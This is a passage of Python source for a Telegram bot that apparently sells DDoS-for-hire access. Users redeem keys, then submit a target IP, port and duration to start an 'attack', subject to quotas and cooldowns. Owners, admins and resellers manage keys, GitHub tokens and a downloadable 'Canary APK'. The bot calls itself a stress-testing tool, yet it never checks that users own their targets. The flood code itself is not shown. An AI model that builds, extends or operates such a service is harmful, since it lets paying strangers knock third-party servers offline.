        help_text = (
            f"<tg-emoji emoji-id='6314482200142157650'>🤖</tg-emoji> <b>ʙᴏᴛ ᴜsᴀɢᴇ ɢᴜɪᴅᴇ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "This bot allows authorized users to perform network validation and stress testing.\n\n"
            f"<tg-emoji emoji-id='5222444124698853913'>🔖</tg-emoji> <b>How to Use Bot Buttons:</b>\n"
            f"• <tg-emoji emoji-id='6311885072072972135'>😀</tg-emoji> <b>Attack:</b> Click to start network stress testing.\n"
            f"• <tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> <b>Status:</b> Click to check the current status of running attacks or cooldown.\n"
            f"• <tg-emoji emoji-id='6311935044017461530'>🔑</tg-emoji> <b>Redeem Key:</b> Click to learn how to redeem access keys for authorized privileges.\n"
            f"• <tg-emoji emoji-id='5339270838627625732'>👤</tg-emoji> <b>My Access:</b> Click to view your bot permissions, remaining attacks, and access expiry.\n"
            f"• <tg-emoji emoji-id='5452026937172048380'>ℹ️</tg-emoji> <b>Help:</b> Show this information guide.\n\n"
            f"<tg-emoji emoji-id='6314048833647024403'>😀</tg-emoji> <b>Owner:</b> @Rytce\n"
            f"<tg-emoji emoji-id='6314558216768329781'>💻</tg-emoji> <b>Developer:</b> @Ccxmod\n"
            "━━━━━━━━━━━━━━━━━━━━━━"
        )
        await update.message.reply_text(help_text, reply_markup=get_user_keyboard(), parse_mode="HTML")

async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    # Restrict to Owners only
    if not is_owner(user_id):
        await update.message.reply_text(
            f"<tg-emoji emoji-id='6089079808187174973'>⚠️</tg-emoji> <b>ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ</b>\n━━━━━━━━━━━━━━━━━━━━━━\nThis panel is restricted to owners only.",
            parse_mode="HTML"
        )
        return
    await update.message.reply_text(
        "⚙️ **ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ**\n━━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
        reply_markup=get_admin_keyboard()
    )

async def addchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can manage force join channels.**")
        return
    
    # Needs: /addchannel <type> <identifier> <name> [chat_id]
    if len(context.args) < 3:
        await update.message.reply_text(
            "<b>Usage:</b>\n"
            "• <code>/addchannel public &lt;username/link&gt; &lt;display_name&gt; [chat_id]</code>\n"
            "• <code>/addchannel private &lt;invite_link&gt; &lt;display_name&gt; &lt;chat_id&gt;</code>",
            parse_mode="HTML"
        )
        return
    
    ch_type = context.args[0].lower()
    identifier = context.args[1]
    name = context.args[2]
    
    if ch_type not in ["public", "private"]:
        await update.message.reply_text("❌ Channel type must be 'public' or 'private'")
        return
        
    chat_id = None
    if ch_type == "private":
        if len(context.args) < 4:
            await update.message.reply_text("❌ Private channels require a channel chat ID as the 4th argument.")
            return
        try:
            chat_id = int(context.args[3])
        except ValueError:
            await update.message.reply_text("❌ Invalid chat ID format. Must be an integer.")
            return
    else:
        # Public: optional chat ID
        if len(context.args) >= 4:
            try:
                chat_id = int(context.args[3])
            except ValueError:
                pass
        
        # If no chat ID provided, we check if identifier starts with @ and parse it
        if chat_id is None:
            if identifier.startswith("@"):
                chat_id = identifier
            elif "t.me/" in identifier:
                # Try parsing username from invite link
                username_part = identifier.split("t.me/")[-1].replace("/", "")
                chat_id = f"@{username_part}"
            else:
                chat_id = identifier

    new_channel = {
        "id": f"channel_{int(time.time())}_{random.randint(1000, 9999)}",
        "type": ch_type,
        "identifier": identifier,
        "chat_id": chat_id,
        "name": name,
        "invite_link": identifier if "t.me/" in identifier else f"https://t.me/{identifier.replace('@', '')}",
        "added_by": user_id,
        "added_at": datetime.now().isoformat()
    }
    
    force_join_db["force_join_channels"].append(new_channel)
    save_force_join(force_join_db)
    await update.message.reply_text(f"✅ Channel <b>{name}</b> added successfully!", parse_mode="HTML")

async def delchannel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can manage force join channels.**")
        return
        
    if len(context.args) < 1:
        await update.message.reply_text("Usage: `/delchannel <channel_index>`")
        return
        
    try:
        idx = int(context.args[0]) - 1
        channels = force_join_db.get("force_join_channels", [])
        if 0 <= idx < len(channels):
            removed = channels.pop(idx)
            save_force_join(force_join_db)
            await update.message.reply_text(f"🗑 Channel <b>{removed['name']}</b> removed successfully!", parse_mode="HTML")
        else:
            await update.message.reply_text("❌ Invalid index. See /admin -> Force Join System for correct channel list indexes.")
    except ValueError:
        await update.message.reply_text("❌ Index must be an integer.")

async def addadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can add admins.**")
        return
    if len(context.args) < 2:
        await update.message.reply_text("Usage: `/addadmin <USER_ID> <USERNAME>`")
        return
    try:
        new_admin_id = int(context.args[0])
        username = context.args[1]
        admins[str(new_admin_id)] = {
            "username": username, "added_by": user_id, "added_date": time.strftime("%Y-%m-%d %H:%M:%S")
        }
        save_admins(admins)
        await update.message.reply_text(f"✅ Admin `{new_admin_id}` (@{username}) added.")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def removeadmin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_owner(user_id):
        await update.message.reply_text("⚠️ **Only owners can remove admins.**")
        return
    if len(context.args) < 1:
        await update.message.reply_text("Usage: `/removeadmin <USER_ID>`")
        return
    try:
        to_remove = int(context.args[0])
        if str(to_remove) in admins:
            del admins[str(to_remove)]
            save_admins(admins)
            await update.message.reply_text(f"✅ Admin `{to_remove}` removed.")
        else:
            await update.message.reply_text("❌ User is not an admin")
    except ValueError:
        await update.message.reply_text("❌ Invalid user ID")

async def render_force_join_menu(query):
    status_label = "✅ ENABLED" if force_join_db.get("force_join_enabled", False) else "❌ DISABLED"
    channels_list = ""
    kb = [
        [
            InlineKeyboardButton("✅ Enable", callback_data="admin_fj_enable"),
            InlineKeyboardButton("❌ Disable", callback_data="admin_fj_disable")
        ]
    ]
    
    for idx, ch in enumerate(force_join_db.get("force_join_channels", []), 1):
        channels_list += f"{idx}. <b>{ch['name']}</b> ({ch['type']}) - <code>{ch['identifier']}</code>\n"
        kb.append([InlineKeyboardButton(f"🗑 Delete Channel {idx}", callback_data=f"admin_fj_del_{idx}")])
        
    if not channels_list:
        channels_list = "<i>No channels added.</i>\n"
    
    text = (
        f"<tg-emoji emoji-id='5458603043203327669'>📢</tg-emoji> <b>FORCE JOIN MANAGEMENT</b>\n"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• Status: <b>{status_label}</b>\n\n"
        f"<b>Active Channels:</b>\n{channels_list}"
        f"━━━━━━━━━━━━━━━━━━━━━━\n"
        f"To add a channel, click one of the buttons below:"
    )
    
    kb.append([
        InlineKeyboardButton("🔗 Add Public", callback_data="admin_fj_add_pub"),
        InlineKeyboardButton("🔗 Add Private", callback_data="admin_fj_add_priv")
    ])
    kb.append([InlineKeyboardButton("➡️ Back", callback_data="admin_panel_back")])
    await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")

async def admin_callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user_id = query.from_user.id
    
    if not is_owner(user_id) and not is_admin(user_id):
        await query.edit_message_text("⚠️ **ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ**")
        return
        
    data = query.data
    # Handling admin_forcejoin_menu earlier
    if data == "admin_forcejoin_menu":
        await render_force_join_menu(query)
    elif data == "admin_bot_stats":
        today_str = time.strftime("%Y-%m-%d")
        total_tracked_users = db["all_bot_users"].count_documents({})
        today_new_users = db["all_bot_users"].count_documents({"joined_date": today_str})
        
        stat_doc = db["daily_attack_stats"].find_one({"_id": today_str})
        today_attacks = stat_doc.get("count", 0) if stat_doc else 0
        
        total_approved = len(approved_users)
        
        stats_text = (
            f"<tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> <b>ʙᴏᴛ sᴛᴀᴛɪsᴛɪᴄs &amp; ᴀɴᴀʟʏᴛɪᴄs</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• 👥 Total Bot Users: <code>{total_tracked_users}</code>\n"
            f"• 🆕 New Users Today: <code>{today_new_users}</code>\n"
            f"• ⚡ Attacks Today: <code>{today_attacks}</code>\n"
            f"• 👤 Active Approved Users: <code>{total_approved}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        await query.edit_message_text(
            stats_text,
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]]),
            parse_mode="HTML"
        )
    elif data == "admin_total_users":
        total_owners = len(owners)
        total_admins = len(admins)
        total_resellers = len(resellers)
        total_approved = len(approved_users)
        all_distinct = set(list(owners.keys()) + list(admins.keys()) + list(resellers.keys()) + list(approved_users.keys()))
        total_unique = len(all_distinct)
        
        await query.edit_message_text(
            f"👥 **ᴛᴏᴛᴀʟ ᴜsᴇʀs ᴍᴇᴛʀɪᴄs**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"• 👑 Owners: `{total_owners}`\n"
            f"• 🛡️ Admins: `{total_admins}`\n"
            f"• 💰 Resellers: `{total_resellers}`\n"
            f"• 👤 Approved: `{total_approved}`\n"
            f"• 📈 Total Unique Users: `{total_unique}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━",
            reply_markup=get_admin_keyboard()
        )
    elif data == "admin_panel_back":
        await query.edit_message_text(
            "⚙️ **ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ**\n━━━━━━━━━━━━━━━━━━━━━━\nSelect an option below:",
            reply_markup=get_admin_keyboard()
        )
    elif data == "admin_add_admin_prompt":
        await query.edit_message_text(
            "➕ **ᴀᴅᴅ ᴀᴅᴍɪɴ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo add an admin, send the command:\n`/addadmin <USER_ID> <USERNAME>`\n\nExample:\n`/addadmin 6390225218 ccxmod`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_remove_admin_prompt":
        await query.edit_message_text(
            "➖ **ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo remove an admin, send the command:\n`/removeadmin <USER_ID>`\n\nExample:\n`/removeadmin 6390225218`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_genkey_prompt":
        await query.edit_message_text(
            "🔑 **ɢᴇɴᴇʀᴀᴛᴇ ᴋᴇʏ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo generate a key, send the command:\n`/genkey <key_name> <max_users> <duration>`\n\nExample:\n`/genkey auto 1 24h`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_keyslist_prompt":
        await query.edit_message_text(
            "📜 **ᴋᴇʏs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo view active keys, send:\n`/keyslist`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_cooldown_prompt":
        await query.edit_message_text(
            "⏳ **sᴇᴛ ᴄᴏᴏʟᴅᴏᴡɴ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo set attack cooldown, send the command:\n`/setcooldown <SECONDS>`\n\nExample:\n`/setcooldown 40`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_maxattacks_prompt":
        await query.edit_message_text(
            "⚡ **sᴇᴛ ᴍᴀx ᴀᴛᴛᴀᴄᴋs**\n━━━━━━━━━━━━━━━━━━━━━━\nTo set max attacks, send:\n`/setmaxattack <NUMBER>`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_userslist_prompt":
        await query.edit_message_text(
            "👥 **ᴜsᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo view approved users, send:\n`/userslist`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_ownerlist_prompt":
        await query.edit_message_text(
            "👑 **ᴏᴡɴᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo view owners list, send:\n`/ownerlist`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_adminlist_prompt":
        await query.edit_message_text(
            "🛡️ **ᴀᴅᴍɪɴs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo view admins list, send:\n`/adminlist`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_resellerlist_prompt":
        await query.edit_message_text(
            "💰 **ʀᴇsᴇʟʟᴇʀs ʟɪsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo view resellers list, send:\n`/resellerlist`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_maint_prompt":
        await query.edit_message_text(
            "🛠 **ᴍᴀɪɴᴛᴇɴᴀɴᴄᴇ ᴍᴏᴅᴇ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo toggle maintenance, send:\n`/maintenance on` or `/maintenance off`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_broadcast_prompt":
        await query.edit_message_text(
            "📢 **ʙʀᴏᴀᴅᴄᴀsᴛ**\n━━━━━━━━━━━━━━━━━━━━━━\nTo broadcast a message, send:\n`/broadcast <Your Message>`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_tokens_prompt":
        await query.edit_message_text(
            "💻 **ɢɪᴛʜᴜʙ ᴛᴏᴋᴇɴs**\n━━━━━━━━━━━━━━━━━━━━━━\nManage tokens with:\n`/addtoken <token>`\n`/tokens`\n`/removetoken <token>`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]])
        )
    elif data == "admin_apk_video_prompt":
        await query.edit_message_text(
            "🤖 **ᴄᴀɴᴀʀʏ ᴀᴘᴋ &amp; ᴠɪᴅᴇᴏ**\n━━━━━━━━━━━━━━━━━━━━━━\nUpload APK with caption `/addapk <instructions>`\nUpload video with caption `/setvideo`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_panel_back", style="primary")]]),
            parse_mode="HTML"
        )

    elif data == "admin_fj_enable":
        force_join_db["force_join_enabled"] = True
        save_force_join(force_join_db)
        await query.answer("Force Join Enabled")
        # Rerender menu
        await render_force_join_menu(query)
    elif data == "admin_fj_disable":
        force_join_db["force_join_enabled"] = False
        save_force_join(force_join_db)
        await query.answer("Force Join Disabled")
        await render_force_join_menu(query)
    elif data == "admin_fj_add_pub":
        channel_setup_state[user_id] = {"type": "public", "step": "name"}
        await query.edit_message_text(
            f"<tg-emoji emoji-id='5271604874419647061'>🔗</tg-emoji> <b>ADD PUBLIC CHANNEL</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Please send the <b>Display Name</b> for the public channel:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_fj_cancel_setup")]]),
            parse_mode="HTML"
        )
    elif data == "admin_fj_add_priv":
        channel_setup_state[user_id] = {"type": "private", "step": "name"}
        await query.edit_message_text(
            f"<tg-emoji emoji-id='5271604874419647061'>🔗</tg-emoji> <b>ADD PRIVATE CHANNEL</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Please send the <b>Display Name</b> for the private channel:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ Cancel", callback_data="admin_fj_cancel_setup")]]),
            parse_mode="HTML"
        )
    elif data == "admin_fj_cancel_setup":
        if user_id in channel_setup_state:
            del channel_setup_state[user_id]
        await render_force_join_menu(query)
    elif data.startswith("admin_fj_del_"):
        try:
            idx = int(data.split("_")[-1]) - 1
            channels = force_join_db.get("force_join_channels", [])
            if 0 <= idx < len(channels):
                removed = channels.pop(idx)
                save_force_join(force_join_db)
                await query.answer(f"Deleted {removed['name']}")
            else:
                await query.answer("Invalid Channel Index")
        except Exception as e:
            await query.answer(f"Error: {e}")
        await render_force_join_menu(query)

async def run_status_query(query, user_id):
    if not can_user_attack(user_id):
        await query.message.reply_text(
            f"<tg-emoji emoji-id='5447644880824181073'>⚠️</tg-emoji> <b>ᴀᴄᴄᴇss ᴅᴇɴɪᴇᴅ</b>",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
        return
    
    attack_status = get_attack_status()
    if attack_status["status"] == "running":
        attack = attack_status["attack"]
        message = (
            f"<tg-emoji emoji-id='6311888443622299860'>✔️</tg-emoji> <b>ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<tg-emoji emoji-id='5447410659077661506'>🌐</tg-emoji> ᴛᴀʀɢᴇᴛ: <code>{attack['ip']}:{attack['port']}</code>\n"
            f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> ᴇʟᴀᴘsᴇᴅ: <code>{attack_status['elapsed']}s</code>\n"
            f"<tg-emoji emoji-id='6314480001118902592'>👁</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ: <code>{attack_status['remaining']}s</code>\n"
            f"<tg-emoji emoji-id='5456140674028019486'>⚡️</tg-emoji> ᴍᴇᴛʜᴏᴅ: <code>{attack['method']}</code>"
        )
    elif attack_status["status"] == "cooldown":
        message = (
            f"<tg-emoji emoji-id='6314480001118902592'>👁</tg-emoji> <b>ᴄᴏᴏʟᴅᴏᴡɴ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<tg-emoji emoji-id='6314480001118902592'>👁</tg-emoji> ʀᴇᴍᴀɪɴɪɴɢ: <code>{attack_status['remaining_cooldown']}s</code>\n"
            f"<tg-emoji emoji-id='5375338737028841420'>🔄</tg-emoji> ɴᴇxᴛ ᴀᴛᴛᴀᴄᴋ ɪɴ: <code>{attack_status['remaining_cooldown']}s</code>"
        )
    else:
        message = (
            f"<tg-emoji emoji-id='5208748315805499400'>✅</tg-emoji> <b>ʀᴇᴀᴅʏ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "ɴᴏ ᴀᴛᴛᴀᴄᴋ ʀᴜɴɴɪɴɢ.\n"
            "ʏᴏᴜ ᴄᴀɴ sᴛᴀʀᴛ ᴀ ɴᴇᴡ ᴀᴛᴛᴀᴄᴋ."
        )
    await query.message.reply_text(message, reply_markup=get_user_keyboard(), parse_mode="HTML")

async def run_myaccess_query(query, user_id):
    if is_owner(user_id):
        role = "👑 ᴘʀɪᴍᴀʀʏ ᴏᴡɴᴇʀ" if is_primary_owner(user_id) else "👑 ᴏᴡɴᴇʀ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_admin(user_id):
        role = "🛡️ ᴀᴅᴍɪɴ"
        expiry = "ʟɪғᴇᴛɪᴍᴇ"
    elif is_reseller(user_id):
        role = "💰 ʀᴇsᴇʟʟᴇʀ"
        reseller_data = resellers.get(str(user_id), {})
        expiry = reseller_data.get('expiry', 'LIFETIME')
    elif is_approved_user(user_id):
        role = "👤 ᴀᴘᴘʀᴏᴠᴇᴅ ᴜsᴇʀ"
        user_data = approved_users.get(str(user_id), {})
        expiry = user_data.get('expiry', '?')
        if expiry != 'LIFETIME':
            try:
                expiry_time = float(expiry)
                if time.time() > expiry_time:
                    expiry = "ᴇxᴘɪʀᴇᴅ"
                else:
                    expiry = time.strftime("%Y-%m-%d %H:%M", time.localtime(expiry_time))
            except:
                pass
    else:
        role = f"<tg-emoji emoji-id='5399850755337240950'>⏳</tg-emoji> ᴘᴇɴᴅɪɴɢ"
        expiry = "ᴡᴀɪᴛɪɴɢ ғᴏʀ ᴀᴘᴘʀᴏᴠᴀʟ / ᴋᴇʏ"
    
    user_id_str = str(user_id)
    current_attacks = user_attack_counts.get(user_id_str, 0)
    remaining_attacks = MAX_ATTACKS - current_attacks
    
    username = query.from_user.username or "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
    
    attack_access_label = f"<tg-emoji emoji-id='5206607081334906820'>✔️</tg-emoji> ʏᴇs" if can_user_attack(user_id) else f"<tg-emoji emoji-id='5210952531676504517'>😀</tg-emoji> ɴᴏ"
    
    await query.message.reply_text(
        f"<tg-emoji emoji-id='5296369303661067030'>🔒</tg-emoji> <b>ʏᴏᴜʀ ᴀᴄᴄᴇss ɪɴғᴏ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• <b>ʀᴏʟᴇ:</b> {role}\n"
        f"• <b>ᴜsᴇʀ ɪᴅ:</b> <code>{user_id}</code>\n"
        f"• <b>ᴜsᴇʀɴᴀᴍᴇ:</b> @{username}\n"
        f"• <b>ᴇxᴘɪʀʏ:</b> {expiry}\n"
        f"• <b>ʀᴇᴍᴀɪɴɪɴɢ ᴀᴛᴛᴀᴄᴋs:</b> <code>{remaining_attacks}/{MAX_ATTACKS}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"<b>ᴀᴛᴛᴀᴄᴋ ᴀᴄᴄᴇss:</b> {attack_access_label}",
        reply_markup=get_user_keyboard(),
        parse_mode="HTML"
    )

async def run_id_query(query, user_id):
    username = query.from_user.username or "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
    await query.message.reply_text(
        f"🆔 **ʏᴏᴜʀ ᴜsᴇʀ ɪᴅᴇɴᴛɪғɪᴄᴀᴛɪᴏɴ**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• **ᴜsᴇʀ ɪᴅ:** `{user_id}`\n"
        f"• **ᴜsᴇʀɴᴀᴍᴇ:** @{username}\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        reply_markup=get_user_keyboard()
    )

async def run_help_query(query, user_id):
    help_text = (
        f"<tg-emoji emoji-id='6314482200142157650'>🤖</tg-emoji> <b>ʙᴏᴛ ᴜsᴀɢᴇ ɢᴜɪᴅᴇ</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "This bot allows authorized users to perform network validation and stress testing.\n\n"
        f"<tg-emoji emoji-id='5222444124698853913'>🔖</tg-emoji> <b>How to Use Bot Buttons:</b>\n"
        f"• <tg-emoji emoji-id='6311885072072972135'>😀</tg-emoji> <b>Attack:</b> Click to start network stress testing.\n"
        f"• <tg-emoji emoji-id='5231200819986047254'>📊</tg-emoji> <b>Status:</b> Click to check the current status of running attacks or cooldown.\n"
        f"• <tg-emoji emoji-id='6311935044017461530'>🔑</tg-emoji> <b>Redeem Key:</b> Click to learn how to redeem access keys for authorized privileges.\n"
        f"• <tg-emoji emoji-id='5339270838627625732'>👤</tg-emoji> <b>My Access:</b> Click to view your bot permissions, remaining attacks, and access expiry.\n"
        f"• <tg-emoji emoji-id='5452026937172048380'>ℹ️</tg-emoji> <b>Help:</b> Show this information guide.\n\n"
        f"<tg-emoji emoji-id='6314048833647024403'>😀</tg-emoji> <b>Owner:</b> @Rytce\n"
        f"<tg-emoji emoji-id='6314558216768329781'>💻</tg-emoji> <b>Developer:</b> @Ccxmod\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    await query.message.reply_text(help_text, reply_markup=get_user_keyboard(), parse_mode="HTML")

async def callback_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    data = query.data
    user_id = query.from_user.id
    
    if data.startswith("admin_"):
        await admin_callback_handler(update, context)
        return
        
    if data == "btn_verify_subscription":
        is_joined, unjoined = await check_force_join(context.bot, user_id)
        if is_joined:
            await query.answer("✅ Verification Successful! Access Granted.", show_alert=True)
            # Remove message and prompt start guide
            await query.message.delete()
            # Send welcome menu
            welcome_text = (
                f"<tg-emoji emoji-id='5222079954421818267'>🤖</tg-emoji> <b>ᴡᴇʟᴄᴏᴍᴇ ᴛᴏ ᴛʜᴇ ʙᴏᴛ</b> <tg-emoji emoji-id='5222079954421818267'>🤖</tg-emoji>\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n"
                f"<tg-emoji emoji-id='5039727497143387500'>👑</tg-emoji> <b>OWNER:</b> @Rytce\n"
                f"<tg-emoji emoji-id='5276527873308499560'>💻</tg-emoji> <b>DEVELOPER:</b> @Ccxmod\n"
                "━━━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<tg-emoji emoji-id='5406745015365943482'>👇</tg-emoji> <b>Use the bottom menu buttons to interact with the bot:</b>"
            )
            await query.message.reply_text(welcome_text, reply_markup=get_user_keyboard(), parse_mode="HTML")
        else:
            await query.answer("❌ You have not joined all channels yet!", show_alert=True)
        return
        
    if data == "btn_attack":
        keyboard = [
            [
                InlineKeyboardButton("Canary APK", callback_data="btn_canary_apk", style="primary", icon_custom_emoji_id="6289414662173755415"),
                InlineKeyboardButton("How to use", callback_data="btn_how_to_use", style="primary", icon_custom_emoji_id="5258274739041883702")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            f"<tg-emoji emoji-id='6017356590238143173'>🎯</tg-emoji> <b>sᴛᴀʀᴛ ᴀᴛᴛᴀᴄᴋ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Send target details directly.\n\n"
            "Format: <code>&lt;IP&gt; &lt;PORT&gt; &lt;TIME&gt;</code>\n"
            "Example:\n<code>1.1.1.1 80 60</code>",
            reply_markup=reply_markup,
            parse_mode="HTML"
        )
    elif data == "btn_canary_apk":
        # Check cooldown (10 minutes = 600s) for non-owners
        current_time = time.time()
        if not is_owner(user_id):
            cooldown_doc = db["canary_cooldowns"].find_one({"_id": str(user_id)})
            if cooldown_doc:
                last_download = cooldown_doc.get("last_download", 0)
                if current_time - last_download < 600:
                    remaining = int(600 - (current_time - last_download))
                    minutes = remaining // 60
                    seconds = remaining % 60
                    await query.message.reply_text(
                        f"<tg-emoji emoji-id='5258274739041883702'>⚠️</tg-emoji> <b>ᴄᴏᴏʟᴅᴏᴡɴ ᴀᴄᴛɪᴠᴇ</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━\n"
                        f"You can download the Canary APK again in <code>{minutes}m {seconds}s</code>.",
                        parse_mode="HTML"
                    )
                    return

        doc = db["canary_apk"].find_one({"_id": "latest"})
        if doc and doc.get("file_id"):
            # Update cooldown only for non-owners
            if not is_owner(user_id):
                db["canary_cooldowns"].update_one(
                    {"_id": str(user_id)},
                    {"$set": {"last_download": current_time}},
                    upsert=True
                )
            
            caption = doc.get("description", "") or f"<tg-emoji emoji-id='6289414662173755415'>👾</tg-emoji> <b>Canary APK</b>"
            info_text = (
                f"\n\n<tg-emoji emoji-id='5258274739041883702'>ℹ️</tg-emoji> <b>If you don't know how to use it, click the 'How to use' button to watch the video guide.</b>"
                f"\n\n<tg-emoji emoji-id='5258274739041883702'>⚠️</tg-emoji> <b>Save this file! It will be deleted in 2 minutes.</b>"
            )
            full_caption = caption + info_text
            
            sent_msg = await context.bot.send_document(
                chat_id=query.message.chat_id,
                document=doc["file_id"],
                caption=full_caption,
                parse_mode="HTML"
            )
            
            # Auto deletion after 120 seconds
            async def delete_msg(bot, chat_id, msg_id):
                await asyncio.sleep(120)
                try:
                    await bot.delete_message(chat_id=chat_id, message_id=msg_id)
                except Exception:
                    pass
            
            context.application.create_task(delete_msg(context.bot, query.message.chat_id, sent_msg.message_id))
        else:
            await query.message.reply_text("❌ **Canary APK has not been added yet.**")
    elif data == "btn_how_to_use":
        doc = db["how_to_use"].find_one({"_id": "latest"})
        if doc and doc.get("file_id"):
            await context.bot.send_video(
                chat_id=query.message.chat_id,
                video=doc["file_id"],
                caption="ℹ️ **How to Use Video Guide**"
            )
        else:
            await query.message.reply_text("❌ **How to Use video has not been set yet.**")
    elif data == "btn_status":
        await run_status_query(query, user_id)
    elif data == "btn_redeem":
        await query.message.reply_text(
            f"<tg-emoji emoji-id='6311935044017461530'>🔑</tg-emoji> <b>ʀᴇᴅᴇᴇᴍ ᴋᴇʏ</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "Send your access key directly to redeem it.\n\n"
            "Format: <code>&lt;KEY&gt;</code>\n"
            "Example:\n<code>KEY-ABCD-1234</code>",
            reply_markup=get_user_keyboard(),
            parse_mode="HTML"
        )
    elif data == "btn_myaccess":
        await run_myaccess_query(query, user_id)
    elif data == "btn_myid":
        await run_id_query(query, user_id)
    elif data == "btn_help":
        await run_help_query(query, user_id)

async def id_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username or "ɴᴏ ᴜsᴇʀɴᴀᴍᴇ"
    
    await update.message.reply_text(
